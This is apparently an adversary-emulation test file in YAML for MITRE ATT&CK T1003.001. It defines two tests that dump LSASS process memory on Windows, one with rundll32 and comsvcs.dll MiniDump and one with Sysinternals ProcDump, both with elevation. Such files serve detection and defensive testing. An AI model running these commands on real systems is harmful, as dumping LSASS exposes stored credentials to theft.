attack_technique: T1003.001
display_name: LSASS Memory
atomic_tests:
- name: Dump LSASS.exe Memory using comsvcs.dll
  auto_generated_guid: 5f1c4c2e-8f3a-4d21-9b6e-1a2c3d4e5f60
  description: Dumps process memory using the built-in comsvcs.dll MiniDump export.
  supported_platforms:
  - windows
  executor:
    name: powershell
    elevation_required: true
    command: |
      rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump #{lsass_pid} #{output_file} full
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 0d5f2b6a-3c47-4e18-8f92-6b1d3c4e5a71
  description: Uses Sysinternals ProcDump to write an LSASS dump.
  supported_platforms:
  - windows
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      procdump.exe -accepteula -ma #{lsass_pid} #{output_file}
